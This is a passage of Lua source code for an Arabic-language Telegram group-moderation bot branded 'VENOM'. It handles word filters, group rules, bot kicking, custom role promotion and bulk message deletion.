for k,v in pairs(list) do  
database:del(bot_id.."VENOM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."VENOM1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."VENOM1:List:Filter"..msg.chat_id_,v)  
end  
send(msg.chat_id_, msg.id_," 𖥔 تم مسح قائمه المنع")  
end

if text == "قائمه المنع" and Manager(msg) then   
local list = database:smembers(bot_id.."VENOM1:List:Filter"..msg.chat_id_)  
t = "\n 𖥔 قائمة المنع \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do  
local VENOM_Msg = database:get(bot_id.."VENOM1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." ↭ {"..VENOM_Msg.."}\n"    
end  
if #list == 0 then  
t = " 𖥔 لا يوجد كلمات ممنوعه"  
end  
send(msg.chat_id_, msg.id_,t)  
end  
if text == 'مسح قائمه منع المتحركات' and Manager(msg) then     
database:del(bot_id.."filteranimation"..msg.chat_id_)
send(msg.chat_id_, msg.id_,' ?? تم مسح قائمه منع المتحركات')  
end
if text == 'مسح قائمه منع الصور' and Manager(msg) then     
database:del(bot_id.."filterphoto"..msg.chat_id_)
send(msg.chat_id_, msg.id_,' 𖥔 تم مسح قائمه منع الصور')  
end
if text == 'مسح قائمه منع الملصقات' and Manager(msg) then     
database:del(bot_id.."filtersteckr"..msg.chat_id_)
send(msg.chat_id_, msg.id_,' 𖥔 تم مسح قائمه منع الملصقات')  
end
------------------

if text == 'مسح كليشه المطور' and Devban(msg) then
database:del(bot_id..'TEXT_SUDO')
send(msg.chat_id_, msg.id_,' 𖥔 تم مسح كليشه المطور')
end
if text == 'ضع كليشه المطور' and Devban(msg) then
database:set(bot_id..'Set:TEXT_SUDO'..msg.chat_id_..':'..msg.sender_user_id_,true)
send(msg.chat_id_,msg.id_,' 𖥔 ارسل الكليشه الان')
return false
end
if text and database:get(bot_id..'Set:TEXT_SUDO'..msg.chat_id_..':'..msg.sender_user_id_) then
if text == 'الغاء' then 
database:del(bot_id..'Set:TEXT_SUDO'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,' 𖥔 تم الغاء حفظ كليشة المطور')
return false
end
database:set(bot_id..'TEXT_SUDO',text)
database:del(bot_id..'Set:TEXT_SUDO'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,' 𖥔 تم حفظ كليشة المطور')
return false
end
-----------------
if text == 'تعين الايدي' and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:setex(bot_id.."CHENG:ID"..msg.chat_id_..""..msg.sender_user_id_,240,true)  
local Text= [[
 𖥔 ارسل الان النص
 𖥔 يمكنك اضافه :
 𖥔 `#rdphoto` ⇜ تعليق الصوره
 𖥔 `#username` ⇜ اسم 
 𖥔 `#msgs` ⇜ عدد رسائل 
 𖥔 `#photos` ⇜ عدد صور 
 𖥔 `#id` ⇜ ايدي 
 𖥔 `#auto` ⇜ تفاعل 
 𖥔 `#stast` ⇜ موقع  
 𖥔 `#edit` ⇜ السحكات
 𖥔 `#game` ⇜ النقاط
]]
send(msg.chat_id_, msg.id_,Text)
return false  
end 
if text == 'مسح الايدي' or text == 'مسح الايدي' then
if Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:del(bot_id.."KLISH:ID"..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖥔 تم ازالة كليشة الايدي')
end
return false  
end 

if database:get(bot_id.."CHENG:ID"..msg.chat_id_..""..msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_," 𖥔 تم الغاء تعين الايدي") 
database:del(bot_id.."CHENG:ID"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
database:del(bot_id.."CHENG:ID"..msg.chat_id_..""..msg.sender_user_id_) 
local CHENGER_ID = text:match("(.*)")  
database:set(bot_id.."KLISH:ID"..msg.chat_id_,CHENGER_ID)
send(msg.chat_id_, msg.id_,' 𖥔 تم تعين الايدي')    
end

if text == 'طرد البوتات' and Mod(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
tdcli_function ({ ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah)  
local admins = tah.members_  
local x = 0
local c = 0
for i=0 , #admins do 
if tah.members_[i].status_.ID == "ChatMemberStatusEditor" then  
x = x + 1 
end
if tonumber(admins[i].user_id_) ~= tonumber(bot_id) then
chat_kick(msg.chat_id_,admins[i].user_id_)
end
c = c + 1
end     
if (c - x) == 0 then
send(msg.chat_id_, msg.id_, " 𖥔 لا توجد بوتات في الجروب")
else
local t = ' 𖥔 عدد البوتات هنا >> {'..c..'}\n 𖥔 عدد البوتات التي هي ادمن >> {'..x..'}\n 𖥔 تم طرد >> {'..(c - x)..'} من البوتات'
send(msg.chat_id_, msg.id_,t) 
end 
end,nil)  
end   
end
if text == ("كشف البوتات") and Mod(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
tdcli_function ({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(extra,result,success)
local admins = result.members_  
text = "\n 𖥔 قائمة البوتات الموجوده \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
local n = 0
local t = 0
for i=0 , #admins do 
n = (n + 1)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_
},function(arg,ta) 
if result.members_[i].status_.ID == "ChatMemberStatusMember" then  
tr = ''
elseif result.members_[i].status_.ID == "ChatMemberStatusEditor" then  
t = t + 1
tr = ' {★}'
end
text = text..">> [@"..ta.username_..']'..tr.."\n"
if #admins == 0 then
send(msg.chat_id_, msg.id_, " 𖥔 لا توجد بوتات في الجروب")
return false 
end
if #admins == i then 
local a = '\n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n 𖥔 عدد البوتات التي هنا >> {'..n..'} بوت\n'
local f = ' 𖥔 عدد البوتات التي هي ادمن >> {'..t..'}\n 𖥔 ملاحضه علامة ال ( 𖥔) تعني ان البوت ادمن \n'
send(msg.chat_id_, msg.id_, text..a..f)
end
end,nil)
end
end,nil)
end

if database:get(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_, " 𖥔 تم الغاء حفظ القوانين") 
database:del(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
return false  
end 
database:set(bot_id.."Set:Rules:Group" .. msg.chat_id_,text) 
send(msg.chat_id_, msg.id_," 𖥔 تم حفظ قوانين الجروب") 
database:del(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
end  

if text == 'ضع قوانين' or text == 'وضع قوانين' then 
if Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:setex(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_,msg.id_," 𖥔 ارسل لي القوانين الان")  
end
end
if text == 'مسح القوانين' or text == 'مسح القوانين' then  
if Mod(msg) then
send(msg.chat_id_, msg.id_," 𖥔 تم ازالة قوانين الجروب")  
database:del(bot_id.."Set:Rules:Group"..msg.chat_id_) 
end
end
if text == 'القوانين' then 
local Set_Rules = database:get(bot_id.."Set:Rules:Group" .. msg.chat_id_)   
if Set_Rules then     
send(msg.chat_id_,msg.id_, Set_Rules)   
else      
send(msg.chat_id_, msg.id_," 𖥔 لا توجد قوانين")   
end    
end
if text == 'قفل التفليش' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id..'lock:tagrvrbot'..msg.chat_id_,true)   
list ={"lock:Bot:kick","lock:user:name","lock:Link","lock:forward","lock:Sticker","lock:Animation","lock:Video","lock:Fshar","lock:Fars","Bot:Id:Photo","lock:Audio","lock:vico","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..lock..msg.chat_id_,'del')    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل التفليش ')  
end,nil)   
end
if text == 'فتح التفليش' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id..'lock:tagrvrbot'..msg.chat_id_)   
list ={"lock:Bot:kick","lock:user:name","lock:Link","lock:forward","lock:Sticker","lock:Animation","lock:Video","lock:Fshar","lock:Fars","Bot:Id:Photo","lock:Audio","lock:vico","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:del(bot_id..lock..msg.chat_id_)    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 مع فـتح التفليش ')  
end,nil)   
end
if text == 'طرد المحذوفين' or text == 'مسح المحذوفين' then  
if Mod(msg) then    
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),offset_ = 0,limit_ = 1000}, function(arg,del)
for k, v in pairs(del.members_) do
tdcli_function({ID = "GetUser",user_id_ = v.user_id_},function(b,data) 
if data.first_name_ == false then
Group_Kick(msg.chat_id_, data.id_)
end
end,nil)
end
send(msg.chat_id_, msg.id_,' 𖥔 تم طرد المحذوفين')
end,nil)
end
end
if text == 'الصلاحيات' and Mod(msg) then 
local list = database:smembers(bot_id..'Coomds'..msg.chat_id_)
if #list == 0 then
send(msg.chat_id_, msg.id_,' 𖥔 لا توجد صلاحيات مضافه')
return false
end
t = "\n 𖥔 قائمة الصلاحيات المضافه \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
var = database:get(bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
if var then
t = t..''..k..'- '..v..'  ↚ ('..var..')\n'
else
t = t..''..k..'- '..v..'\n'
end
end
send(msg.chat_id_, msg.id_,t)
end
if text and text:match("^اضف صلاحيه (.*)$") and Mod(msg) then 
ComdNew = text:match("^اضف صلاحيه (.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:set(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
database:sadd(bot_id.."Coomds"..msg.chat_id_,ComdNew)  
database:setex(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_,200,true)  
send(msg.chat_id_, msg.id_, " 𖥔 ارسل نوع الرتبه \n 𖥔 {عـضـو -- ممـيـز -- ادمـن -- مـديـر}") 
end
if text and text:match("^مسح صلاحيه (.*)$") and Mod(msg) then 
ComdNew = text:match("^مسح صلاحيه (.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:del(bot_id.."Comd:New:rt:bot:"..ComdNew..msg.chat_id_)
send(msg.chat_id_, msg.id_, "* 𖥔 تم مسح الصلاحيه *\n") 
end
if database:get(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_,"* 𖥔 تم الغاء الامر *\n") 
database:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
if text == 'مدير' then
if not Constructor(msg) then
send(msg.chat_id_, msg.id_"* 𖥔 تستطيع اضافه صلاحيات {ادمن - مميز - عضو} \n 𖥔 ارسل الصلاحيه مجددا*\n") 
return false
end
end
if text == 'ادمن' then
if not Manager(msg) then 
send(msg.chat_id_, msg.id_,"* 𖥔 تستطيع اضافه صلاحيات {مميز - عضو} \n 𖥔 ارسل الصلاحيه مجددا*\n") 
return false
end
end
if text == 'مميز' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,"* 𖥔  تستطيع اضافه صلاحيات {عضو} \n 𖥔 ارسل الصلاحيه مجددا*\n") 
return false
end
end
if text == 'مدير' or text == 'ادمن' or text == 'مميز' or text == 'عضو' then
local textn = database:get(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
database:set(bot_id.."Comd:New:rt:bot:"..textn..msg.chat_id_,text)
send(msg.chat_id_, msg.id_, " 𖥔 تـم اضـافـه الامـر") 
database:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
end
if text and text:match('رفع (.*)') and tonumber(msg.reply_to_message_id_) > 0 and Mod(msg) then 
local RTPA = text:match('رفع (.*)')
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:sismember(bot_id..'Coomds'..msg.chat_id_,RTPA) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local blakrt = database:get(bot_id.."Comd:New:rt:bot:"..RTPA..msg.chat_id_)
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'..'\n 𖥔 تم رفعه '..RTPA..'\n')   
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_,RTPA) 
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.sender_user_id_)  
elseif blakrt == 'ادمن' and Manager(msg) then 
send(msg.chat_id_, msg.id_,'\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'..'\n 𖥔 تم رفعه '..RTPA..'\n')   
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_,RTPA)
database:sadd(bot_id..'Mod:User'..msg.chat_id_,result.sender_user_id_)  
elseif blakrt == 'مدير' and Constructor(msg) then
send(msg.chat_id_, msg.id_,'\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'..'\n 𖥔 تم رفعه '..RTPA..'\n')   
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_,RTPA)  
database:sadd(bot_id..'Manager'..msg.chat_id_,result.sender_user_id_)  
elseif blakrt == 'عضو' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'..'\n 𖥔 تم رفعه '..RTPA..'\n')   
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match('تنزيل (.*)') and tonumber(msg.reply_to_message_id_) > 0 and Mod(msg) then 
local RTPA = text:match('تنزيل (.*)')
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:sismember(bot_id..'Coomds'..msg.chat_id_,RTPA) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local blakrt = database:get(bot_id.."Comd:New:rt:bot:"..RTPA..msg.chat_id_)
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'..'\n 𖥔 م تنزيله من '..RTPA..'\n')   
database:srem(bot_id..'Special:User'..msg.chat_id_,result.sender_user_id_)  
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_)
elseif blakrt == 'ادمن' and Manager(msg) then 
send(msg.chat_id_, msg.id_,'\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'..'\n 𖥔 تم تنزيله من '..RTPA..'\n')   
database:srem(bot_id..'Mod:User'..msg.chat_id_,result.sender_user_id_) 
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_)
elseif blakrt == 'مدير' and Constructor(msg) then
send(msg.chat_id_, msg.id_,'\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'..'\n 𖥔  تم تنزيله من '..RTPA..'\n')   
database:srem(bot_id..'Manager'..msg.chat_id_,result.sender_user_id_)  
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_)
elseif blakrt == 'عضو' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'..'\n 𖥔 تم تنزيله من '..RTPA..'\n')   
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match('^رفع (.*) @(.*)') and Mod(msg) then 
local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:sismember(bot_id..'Coomds'..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local blakrt = database:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(text1[3] or 'textchuser')..')'..'\n 𖥔 تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_,text1[2])
elseif blakrt == 'ادمن' and Manager(msg) then 
send(msg.chat_id_, msg.id_,'\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(text1[3] or 'textchuser')..')'..'\n 𖥔 تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Mod:User'..msg.chat_id_,result.id_)  
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_,text1[2])
elseif blakrt == 'مدير' and Constructor(msg) then
send(msg.chat_id_, msg.id_,'\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(text1[3] or 'textchuser')..')'..'\n 𖥔 تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Manager'..msg.chat_id_,result.id_)  
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_,text1[2])
elseif blakrt == 'عضو' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(text1[3] or 'textchuser')..')'..'\n 𖥔 تم رفعه '..text1[2]..'')   
end
else
info = ' 𖥔 المعرف غلط'
send(msg.chat_id_, msg.id_,info)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end 
end
if text and text:match('^تنزيل (.*) @(.*)') and Mod(msg) then 
local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:sismember(bot_id..'Coomds'..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local blakrt = database:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(text1[3] or 'textchuser')..')'..'\n 𖥔 تم تنريله من '..text1[2]..'')   
database:srem(bot_id..'Special:User'..msg.chat_id_,result.id_)  
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_)
elseif blakrt == 'ادمن' and Manager(msg) then 
send(msg.chat_id_, msg.id_,'\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(text1[3] or 'textchuser')..')'..'\n 𖥔 تم تنريله من '..text1[2]..'')   
database:srem(bot_id..'Mod:User'..msg.chat_id_,result.id_)  
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_)
elseif blakrt == 'مدير' and Constructor(msg) then
send(msg.chat_id_, msg.id_,'\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(text1[3] or 'textchuser')..')'..'\n 𖥔 تم تنريله من '..text1[2]..'')   
database:srem(bot_id..'Manager'..msg.chat_id_,result.id_)  
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_)
elseif blakrt == 'عضو' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(text1[3] or 'textchuser')..')'..'\n 𖥔 تم تنريله من '..text1[2]..'')   
end
else
info = ' 𖥔 المعرف غلط'
send(msg.chat_id_, msg.id_,info)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end  
end
if text == "مسح رسايلي" or text == "مسح رسائلي" or text == "مسح رسايلي" or text == "مسح رسائلي" then  
send(msg.chat_id_, msg.id_,' 𖥔 تم مسح رسائلك'  )  
database:del(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) 
end
if text == "رسايلي" or text == "رسائلي" or text == "msg" then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
send(msg.chat_id_, msg.id_,' 𖥔 عدد رسائلك  ↚ { '..database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_)..'}' ) 
end 
if text == 'تفعيل الاذاعه' and SudoBot(msg) then  
if database:get(bot_id..'Bc:Bots') then
database:del(bot_id..'Bc:Bots') 
Text = '\n 𖥔 تم تفعيل الاذاعه' 
else
Text = '\n 𖥔 بالتاكيد تم تفعيل الاذاعه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الاذاعه' and SudoBot(msg) then  
if not database:get(bot_id..'Bc:Bots') then
database:set(bot_id..'Bc:Bots',true) 
Text = '\n 𖥔 تم تعطيل الاذاعه' 
else
Text = '\n 𖥔  بالتاكيد تم تعطيل الاذاعه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل التواصل' and SudoBot(msg) then  
if database:get(bot_id..'Tuasl:Bots') then
database:del(bot_id..'Tuasl:Bots') 
Text = '\n 𖥔 تم تفعيل التواصل' 
else
Text = '\n 𖥔 بالتاكيد تم تفعيل التواصل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل التواصل' and SudoBot(msg) then  
if not database:get(bot_id..'Tuasl:Bots') then
database:set(bot_id..'Tuasl:Bots',true) 
Text = '\n 𖥔 تم تعطيل التواصل' 
else
Text = '\n 𖥔 بالتاكيد تم تعطيل التواصل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل البوت الخدمي' and SudoBot(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Free:Bots') then
database:del(bot_id..'Free:Bots') 
Text = '\n 𖥔 تم تفعيل البوت الخدمي' 
else
Text = '\n 𖥔 بالتاكيد تم تفعيل البوت الخدمي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل البوت الخدمي' and SudoBot(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if not database:get(bot_id..'Free:Bots') then
database:set(bot_id..'Free:Bots',true) 
Text = '\n 𖥔 تم تعطيل البوت الخدمي' 
else
Text = '\n 𖥔 بالتاكيد تم تعطيل البوت الخدمي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text and text:match('^مسح (%d+)$') and Manager(msg) then
if not database:get(bot_id..'banda:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then           
local num = tonumber(text:match('^مسح (%d+)$')) 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if num > 1000 then 
send(msg.chat_id_, msg.id_,' 𖥔تستطيع التنظيف 1000 رساله كحد اقصى') 
return false  
end  
local msgm = msg.id_
for i=1,tonumber(num) do
DeleteMessage(msg.chat_id_, {[0] = msgm})
msgm = msgm - 1048576
end
send(msg.chat_id_,msg.id_,' 𖥔 تم مسح {'..num..'}')  
database:setex(bot_id..'banda:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end
end
if text == "تنظيف الميديا" and Manager(msg) then
msgm = {[0]=msg.id_}
local Message = msg.id_
for i=1,100 do
Message = Message - 1048576
msgm[i] = Message
end
tdcli_function({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = msgm},function(arg,data)
new = 0
msgm2 = {}
for i=0 ,data.total_count_ do
